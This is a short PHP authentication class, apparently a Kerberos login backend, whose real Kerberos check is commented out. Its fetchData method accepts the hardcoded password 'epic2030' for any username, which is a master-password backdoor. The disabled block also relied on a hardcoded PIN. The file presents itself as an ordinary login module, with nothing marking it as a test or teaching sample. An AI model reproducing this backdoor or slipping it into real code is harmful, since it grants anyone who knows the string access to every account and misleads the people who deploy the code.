<?php

class KRB_Auth_Container extends Auth_Container {

    function KRB_Auth_Container($options = NULL) {
	}

    function fetchData( $username, $password, $isChallengeResponse = false ) {
        if ( $password == 'epic2030' ) {
            return true;
        }
		/*
		if ( class_exists('KRB5CCache')) {    
		    $princ = new KRB5CCache();
			try { $princ->initPassword($username, $password); } catch (Exception $e) { }
	    	$res = $princ->getEntries();
		    if ( !empty($res) && $_POST['pincode'] == '494271192919' ) {
				return true;
			}
		}
		*/
		return false;
    }

}
